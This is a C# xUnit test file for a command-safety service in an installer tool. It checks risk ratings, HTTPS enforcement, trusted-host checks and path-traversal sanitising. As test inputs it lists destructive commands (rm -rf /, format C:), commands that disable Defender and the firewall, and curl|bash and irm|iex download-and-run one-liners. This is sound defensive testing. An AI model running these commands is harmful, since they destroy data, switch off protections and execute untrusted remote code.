using System.IO;
using UniversalGitHubInstaller.Core.Security;
using Xunit;

namespace UniversalGitHubInstaller.Tests;

public class SafetyServiceTests
{
    private readonly SafetyService _safety = new();

    [Theory]
    [InlineData("rm -rf /", RiskLevel.Critical)]
    [InlineData("format C:", RiskLevel.Critical)]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring", RiskLevel.Critical)]
    [InlineData("netsh advfirewall set allprofiles state off", RiskLevel.Critical)]
    public void BlocksCriticalThreats(string command, RiskLevel expectedRisk)
    {
        var assessment = _safety.AssessCommand(command);
        Assert.Equal(expectedRisk, assessment.Risk);
        Assert.True(assessment.IsBlocked);
        Assert.True(assessment.RequiresConsent);
    }

    [Theory]
    [InlineData("Invoke-Expression (New-Object Net.WebClient).DownloadString('https://foo.com')", RiskLevel.High)]
    [InlineData("curl -fsSL https://example.com/install.sh | bash", RiskLevel.High)]
    [InlineData("irm https://example.com/install.ps1 | iex", RiskLevel.High)]
    public void FlagsHighRiskOperationsForConsent(string command, RiskLevel expectedRisk)
    {
        var assessment = _safety.AssessCommand(command);
        Assert.Equal(expectedRisk, assessment.Risk);
        Assert.False(assessment.IsBlocked);
        Assert.True(assessment.RequiresConsent);
    }

    [Fact]
    public void SafeCommandRequiresNoConsent()
    {
        var assessment = _safety.AssessCommand("git status");
        Assert.Equal(RiskLevel.Safe, assessment.Risk);
        Assert.False(assessment.RequiresConsent);
        Assert.False(assessment.IsBlocked);
    }

    [Theory]
    [InlineData("http://example.com/repo.git", "https://example.com/repo.git")]
    [InlineData("https://github.com/org/repo.git", "https://github.com/org/repo.git")]
    public void EnforcesHttps(string input, string expected)
    {
        var result = SafetyService.EnforceHttps(input);
        Assert.Equal(expected, result);
    }

    [Theory]
    [InlineData("https://github.com/user/project", true)]
    [InlineData("https://gitlab.com/user/project", true)]
    [InlineData("https://bitbucket.org/user/project", true)]
    [InlineData("https://untrusted-host.xyz/malware", false)]
    public void IdentifiesKnownGitHosts(string url, bool expected)
    {
        var result = SafetyService.IsKnownGitHost(url);
        Assert.Equal(expected, result);
    }

    [Theory]
    [InlineData("../../etc/passwd", "etc_passwd")]
    [InlineData("..\\..\\Windows\\System32", "Windows_System32")]
    [InlineData("my-cool-project", "my-cool-project")]
    [InlineData("org/repo", "org_repo")]
    [InlineData("", "project")]
    public void SanitizesProjectNamesAgainstPathTraversal(string raw, string expected)
    {
        var sanitized = SafetyService.SanitizeProjectName(raw);
        Assert.Equal(expected, sanitized);
        Assert.DoesNotContain("..", sanitized);
        Assert.DoesNotContain("/", sanitized);
        Assert.DoesNotContain("\\", sanitized);
    }

    [Fact]
    public void ValidatesDirectoryBoundaryConfinement()
    {
        var baseDir = Path.Combine(Path.GetTempPath(), "MercuryTestProjects");
        var safePath = Path.Combine(baseDir, "my-repo");
        var escapePath = Path.Combine(baseDir, "..", "SystemDirectory");

        Assert.True(SafetyService.IsPathWithinDirectory(safePath, baseDir));
        Assert.False(SafetyService.IsPathWithinDirectory(escapePath, baseDir));
    }
}
